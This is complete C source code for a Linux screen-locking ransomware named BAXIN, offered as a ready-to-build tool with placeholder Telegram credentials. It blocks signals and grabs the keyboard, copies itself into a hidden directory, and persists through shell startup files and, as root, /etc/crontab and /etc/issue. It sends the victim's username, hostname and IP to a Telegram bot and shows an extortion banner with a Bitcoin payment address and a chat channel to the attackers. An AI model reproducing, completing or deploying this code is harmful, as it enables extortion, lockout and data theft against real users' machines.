#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/file.h>
#include <fcntl.h>
#include <signal.h>
#include <time.h>
#include <termios.h>
#include <pwd.h>
#include <curl/curl.h>
#include <X11/Xlib.h>
#include <pthread.h>
#include <json-c/json.h>

#define UNLOCK_CODE "darkness2025"
#define BOT_TOKEN "ISI_BOT_TOKEN_KAMU"
#define CHAT_ID "ISI_CHAT_ID_KAMU"
#define INSTALL_DIR "/.config/.immortal/"
#define SCRIPT_NAME "immortal"
#define HACKER_NAME "BAXIN"

char full_path[256];
char lock_file[] = "/tmp/.immortal_lock";
Display *display;
int chat_active = 0;
pthread_t chat_thread;
char victim_id[100] = {0};

struct MemoryStruct {
    char *memory;
    size_t size;
};

void color_print(const char* text, const char* color) {
    if (strcmp(color, "red") == 0) printf("\033[91m");
    else if (strcmp(color, "green") == 0) printf("\033[92m");
    else if (strcmp(color, "cyan") == 0) printf("\033[96m");
    else if (strcmp(color, "yellow") == 0) printf("\033[93m");
    else if (strcmp(color, "bold") == 0) printf("\033[1m");
    printf("%s\033[0m", text);
}

void block_signals() {
    for (int i = 1; i <= 31; i++) signal(i, SIG_IGN);
}

void disable_keyboard() {
    struct termios term;
    tcgetattr(STDIN_FILENO, &term);
    term.c_lflag &= ~(ICANON | ECHO | ISIG);
    tcsetattr(STDIN_FILENO, TCSANOW, &term);
}

void grab_keyboard() {
    display = XOpenDisplay(NULL);
    if (display) {
        Window root = DefaultRootWindow(display);
        XGrabKeyboard(display, root, True, GrabModeAsync, GrabModeAsync, CurrentTime);
    }
}

void fullscreen_terminal() {
    system("tput civis");
    system("setterm -blank 0 -powersave off -powerdown 0");
    system("resize -s 24 80 > /dev/null");
    system("xset dpms force off");
    system("xset dpms force on");
}

size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
    return size * nmemb;
}

void send_message_to_bot(const char *message) {
    CURL *curl;
    CURLcode res;
    
    char url[256];
    char post_fields[512];
    
    snprintf(url, sizeof(url), "https://api.telegram.org/bot%s/sendMessage", BOT_TOKEN);
    snprintf(post_fields, sizeof(post_fields), "chat_id=%s&text=%s", CHAT_ID, message);
    
    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_fields);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
    }
}

void send_log() {
    char ip[100] = "Unknown";
    char user[100];
    char host[100];
    char message[512];
    time_t now;
    struct tm *tm;
    struct passwd *pw = getpwuid(getuid());
    
    if (pw) strcpy(user, pw->pw_name);
    else strcpy(user, "Unknown");
    
    gethostname(host, sizeof(host));
    time(&now);
    tm = localtime(&now);
    
    FILE *ip_pipe = popen("curl -s https://api.ipify.org", "r");
    if (ip_pipe) {
        fgets(ip, sizeof(ip), ip_pipe);
        pclose(ip_pipe);
    }
    
    snprintf(victim_id, sizeof(victim_id), "%s-%d", host, getuid());
    
    snprintf(message, sizeof(message), 
             "📥 BAXIN Activated\n👤 Victim: %s\n💻 Host: %s\n🌐 IP: %s\n🆔 Victim ID: %s\n🕒 %02d/%02d/%04d %02d:%02d:%02d",
             user, host, ip, victim_id, tm->tm_mday, tm->tm_mon+1, 
             tm->tm_year+1900, tm->tm_hour, tm->tm_min, tm->tm_sec);
    
    send_message_to_bot(message);
}

void animate_text(const char* text, float delay) {
    for (int i = 0; text[i] != '\0'; i++) {
        putchar(text[i]);
        fflush(stdout);
        usleep(delay * 1000000);
    }
    putchar('\n');
}

void show_baxin_banner() {
    system("clear");
    color_print("\n\n", "bold");
    color_print("`7MM""""Yp,     db     YMM'      `MP'`7MMF'`7MN.   `7MF'\n", "red");
    color_print("  MM    Yb     ;MM:       VMb.  ,P     MM    MMN.    M  \n", "red");
    color_print("  MM    dP    ,V^MM.       `MM.M'      MM    M YMb   M  \n", "red");
    color_print("  MM""""bg.  ,M  `MM         MMb       MM    M  `MN. M  \n", "red");
    color_print("  MM    `Y   AbmmmqMA      ,M'`Mb.     MM    M   `MM.M  \n", "red");
    color_print("  MM    ,9  A'     VML    ,P   `MM.    MM    M     YMM  \n", "red");
    color_print(".JMMmmmd9 .AMA.   .AMMA..MM:.  .:MMa..JMML..JML.    YM  \n", "red");
    
    color_print("\nWell, you are here. It means that you're suffering from cyber incident right now.\n", "bold");
    color_print("Think of our action as an unscheduled forced audit of your network for vulnerabilities.\n", "bold");
    color_print("Keep in mind that there is a fair price to make it all go away.\n\n", "bold");
    
    color_print("Do not rush to assess what is happening - we did it to you.\n", "cyan");
    color_print("The best thing you can do is to follow our instructions to get back to your daily routine,\n", "cyan");
    color_print("by cooperating with us you will minimize the damage that might be done.\n\n", "cyan");
    
    color_print("Those who choose different path will be shamed publicly.\n", "red");
    color_print("Remember, You are unable to recover without our help.\n", "red");
    color_print("Your data is already gone and cannot be traced to the place of final storage\n", "red");
    color_print("nor deleted by anyone besides us.\n\n", "red");
    
    color_print("Baxin@locked-system-$ ", "green");
}

void show_help() {
    color_print("\nList of all commands:\n\n", "bold");
    color_print("| unlock    | -- enter unlock code to restore system    |\n", "cyan");
    color_print("| chat      | -- start two-way communication with us   |\n", "cyan");
    color_print("| payment   | -- view payment instructions            |\n", "cyan");
    color_print("| help      | -- show this help message               |\n", "cyan");
    color_print("| clear     | -- clear screen                        |\n\n", "cyan");
}

static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    struct MemoryStruct *mem = (struct MemoryStruct *)userp;
    
    char *ptr = realloc(mem->memory, mem->size + realsize + 1);
    if(!ptr) {
        return 0;
    }
    
    mem->memory = ptr;
    memcpy(&(mem->memory[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->memory[mem->size] = 0;
    
    return realsize;
}

void *check_messages(void *arg) {
    CURL *curl;
    CURLcode res;
    struct MemoryStruct chunk;
    long last_message_id = 0;
    
    chunk.memory = malloc(1);
    chunk.size = 0;
    
    curl = curl_easy_init();
    if(curl) {
        while(chat_active) {
            char url[256];
            snprintf(url, sizeof(url), "https://api.telegram.org/bot%s/getUpdates?offset=%ld", BOT_TOKEN, last_message_id + 1);
            
            curl_easy_setopt(curl, CURLOPT_URL, url);
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
            curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
            
            res = curl_easy_perform(curl);
            
            if(res == CURLE_OK) {
                struct json_object *parsed_json, *result, *message, *chat, *text, *update_id;
                parsed_json = json_tokener_parse(chunk.memory);
                
                if(parsed_json != NULL) {
                    json_object_object_get_ex(parsed_json, "result", &result);
                    
                    if(result != NULL) {
                        int arraylen = json_object_array_length(result);
                        
                        for(int i = 0; i < arraylen; i++) {
                            struct json_object *update = json_object_array_get_idx(result, i);
                            json_object_object_get_ex(update, "message", &message);
                            
                            if(message != NULL) {
                                json_object_object_get_ex(message, "chat", &chat);
                                json_object_object_get_ex(message, "text", &text);
                                json_object_object_get_ex(update, "update_id", &update_id);
                                
                                const char *text_str = json_object_get_string(text);
                                if(strstr(text_str, victim_id) == NULL) {
                                    printf("\n\033[96m[BAXIN]: %s\033[0m\n", text_str);
                                    printf("Baxin@locked-system-$ ");
                                    fflush(stdout);
                                }
                                
                                last_message_id = json_object_get_int64(update_id);
                            }
                        }
                    }
                    json_object_put(parsed_json);
                }
            }
            
            free(chunk.memory);
            chunk.memory = malloc(1);
            chunk.size = 0;
            
            sleep(3);
        }
        curl_easy_cleanup(curl);
    }
    free(chunk.memory);
    return NULL;
}

void start_chat_session() {
    chat_active = 1;
    pthread_create(&chat_thread, NULL, check_messages, NULL);
    
    color_print("\nTwo-way chat session started. Type 'exit' to end chat.\n", "green");
    color_print("All messages will be sent to BAXIN team and replies will appear here.\n\n", "green");
    
    char message[512];
    while(chat_active) {
        printf("You> ");
        fflush(stdout);
        
        fgets(message, sizeof(message), stdin);
        message[strcspn(message, "\n")] = 0;
        
        if(strcmp(message, "exit") == 0) {
            chat_active = 0;
            pthread_join(chat_thread, NULL);
            color_print("\nChat session ended.\n", "yellow");
            break;
        }
        
        char full_message[600];
        snprintf(full_message, sizeof(full_message), "[%s] %s", victim_id, message);
        send_message_to_bot(full_message);
    }
}

void show_payment_info() {
    color_print("\nPayment Instructions:\n", "bold");
    color_print("Send 0,0001048 BTC to the following address:\n", "cyan");
    color_print("bc1q7z6krzj7sgapszmeqheeetalawcdkar2m6l2a9\n\n", "bold");
    color_print("After payment:\n", "cyan");
    color_print("- Contact us with transaction proof\n", "cyan");
    color_print("- Unlock code will be sent within 1 hour\n", "cyan");
    color_print("- System will be completely restored\n\n", "cyan");
}

void install_persistence() {
    char home_dir[256];
    struct passwd *pw = getpwuid(getuid());
    if (pw) {
        strcpy(home_dir, pw->pw_dir);
        char bashrc[256], zshrc[256], profile[256];
        snprintf(bashrc, sizeof(bashrc), "%s/.bashrc", home_dir);
        snprintf(zshrc, sizeof(zshrc), "%s/.zshrc", home_dir);
        snprintf(profile, sizeof(profile), "%s/.profile", home_dir);
        char* rc_files[] = {bashrc, zshrc, profile, NULL};
        for (int i = 0; rc_files[i] != NULL; i++) {
            FILE *f = fopen(rc_files[i], "a+");
            if (f) {
                fprintf(f, "\n%s &\n", full_path);
                fclose(f);
            }
        }
        if (geteuid() == 0) {
            FILE *cron = fopen("/etc/crontab", "a+");
            if (cron) {
                fprintf(cron, "\n@reboot root %s\n", full_path);
                fclose(cron);
            }
            system("cp /etc/issue /etc/issue.bak");
            system("echo '\\n\\n\\033[1;31mYOUR SYSTEM HAS BEEN LOCKED BY BAXIN\\033[0m\\nContact for unlock code\\n\\n' > /etc/issue");
        }
    }
}

void self_copy() {
    char home_dir[256];
    struct passwd *pw = getpwuid(getuid());
    if (pw) {
        strcpy(home_dir, pw->pw_dir);
        snprintf(full_path, sizeof(full_path), "%s%s%s", home_dir, INSTALL_DIR, SCRIPT_NAME);
        char mkdir_cmd[256];
        snprintf(mkdir_cmd, sizeof(mkdir_cmd), "mkdir -p %s%s", home_dir, INSTALL_DIR);
        system(mkdir_cmd);
        FILE *src = fopen("/proc/self/exe", "rb");
        if (src) {
            FILE *dst = fopen(full_path, "wb");
            if (dst) {
                char buf[1024];
                size_t bytes;
                while ((bytes = fread(buf, 1, sizeof(buf), src))) {
                    fwrite(buf, 1, bytes, dst);
                }
                fclose(dst);
                chmod(full_path, 0755);
            }
            fclose(src);
        }
        if (strcmp(full_path, "/proc/self/exe") != 0) {
            install_persistence();
            execl(full_path, full_path, NULL);
        }
    }
}

void cleanup() {
    char home_dir[256];
    struct passwd *pw = getpwuid(getuid());
    if (pw) {
        strcpy(home_dir, pw->pw_dir);
        char rm_cmd[256];
        snprintf(rm_cmd, sizeof(rm_cmd), "rm -rf %s%s", home_dir, INSTALL_DIR);
        system(rm_cmd);
        if (geteuid() == 0) {
            system("mv /etc/issue.bak /etc/issue");
        }
    }
    unlink(lock_file);
    system("tput cnorm");
    system("setterm -blank on -powersave on -powerdown 10");
    if (display) XCloseDisplay(display);
}

void create_lock() {
    time_t now;
    time(&now);
    FILE *f = fopen(lock_file, "w");
    if (f) {
        fprintf(f, "Locked by %s at %s", HACKER_NAME, ctime(&now));
        fclose(f);
    }
}

int is_locked() {
    return access(lock_file, F_OK) == 0;
}

void baxin_lock() {
    block_signals();
    disable_keyboard();
    grab_keyboard();
    fullscreen_terminal();
    if (!is_locked()) {
        create_lock();
        send_log();
    }
    
    while (1) {
        show_baxin_banner();
        
        char command[50];
        fgets(command, sizeof(command), stdin);
        command[strcspn(command, "\n")] = 0;
        
        if (strcmp(command, "unlock") == 0) {
            printf("\033[91mEnter unlock code: \033[0m");
            fflush(stdout);
            struct termios old, new;
            tcgetattr(STDIN_FILENO, &old);
            new = old;
            new.c_lflag &= ~ECHO;
            tcsetattr(STDIN_FILENO, TCSANOW, &new);
            
            char code[50];
            fgets(code, sizeof(code), stdin);
            code[strcspn(code, "\n")] = 0;
            
            tcsetattr(STDIN_FILENO, TCSANOW, &old);
            
            if (strcmp(code, UNLOCK_CODE) == 0) {
                color_print("\nSystem access restored. Cleaning up...\n", "green");
                sleep(1);
                cleanup();
                exit(0);
            } else {
                color_print("\nInvalid unlock code. Attempt logged.\n", "red");
                sleep(2);
            }
        }
        else if (strcmp(command, "chat") == 0) {
            start_chat_session();
        }
        else if (strcmp(command, "payment") == 0) {
            show_payment_info();
        }
        else if (strcmp(command, "help") == 0) {
            show_help();
        }
        else if (strcmp(command, "clear") == 0) {
            system("clear");
        }
        else {
            color_print("\nUnknown command. Type 'help' for available commands.\n", "red");
        }
    }
}

int main() {
    int fd = open(lock_file, O_CREAT | O_WRONLY, 0644);
    if (flock(fd, LOCK_EX | LOCK_NB) == -1) {
        close(fd);
        exit(0);
    }
    atexit(cleanup);
    self_copy();
    baxin_lock();
    return 0;
}
